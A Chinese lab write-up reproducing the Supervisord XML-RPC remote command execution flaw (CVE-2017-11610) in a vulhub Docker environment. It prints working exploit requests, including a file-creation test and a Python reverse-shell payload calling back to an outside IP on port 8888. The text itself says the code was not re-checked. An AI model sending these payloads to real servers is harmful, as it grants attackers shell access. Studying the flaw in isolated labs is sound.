ailx10说：这篇是2024年9月之前写的，后来又改过。我平时接触 Supervisord，更多是把它当成管后台进程的工具，这次才专门沿着 RPC 接口去看它还能调用到什么。实验先用创建文件确认动作，再试 Python 的连接，把“服务端执行了一个预料之外的方法”这件事拆成能观察的步骤。原笔记里拿 Java 反序列化作过类比，方便找感觉，但两者并不是同一套实现。这篇想记住的是对象和方法的边界：接口本来只打算开放管理能力，为什么最后能走到系统命令。

---

本文记录 CVE-2017-11610 在历史隔离环境中的对象访问和命令执行现象。

与 Java 反序列化的比较仅为类比，原文没有提供完整 RPC 对象解析源码；代码与回连现象尚未复验。

好巧不巧的，这个实验室2023年9月做的，一年后的2024年9月，我自己写了一个Python程序，用的就是Supervisord来管理，当程序异常的时候，Supervisord会帮我自动重启，免去了写守护进程和计划任务的操作。

![](/notes-assets/40ba8a8abcd5e9f6aeb2.webp)

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明Supervisord 远程命令执行漏洞（CVE-2017-11610）环境搭建成功了

![](/notes-assets/329f94d8055603446bf5.webp)

先来试一试创建文件

```
POST /RPC2 HTTP/1.1

Host: 144.34.162.13:9001

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 213



<?xml version="1.0"?>

<methodCall>

<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>

<params>

<param>

<string>touch /tmp/success</string>

</param>

</params>

</methodCall>
```

![](/notes-assets/b13d446b1cc5217fc2da.webp)

发现成功创建文件

```
docker exec -it ec46af421051 /bin/bash
```

![](/notes-assets/3c8fa757a749275fc569.webp)

直接利用python代码反弹shell

```
POST /RPC2 HTTP/1.1

Host: 144.34.162.13:9001

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 213



<?xml version="1.0"?>

<methodCall>

<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>

<params>

<param>

<string>

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.137.58.6',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

</string>

</param>

</params>

</methodCall>
```
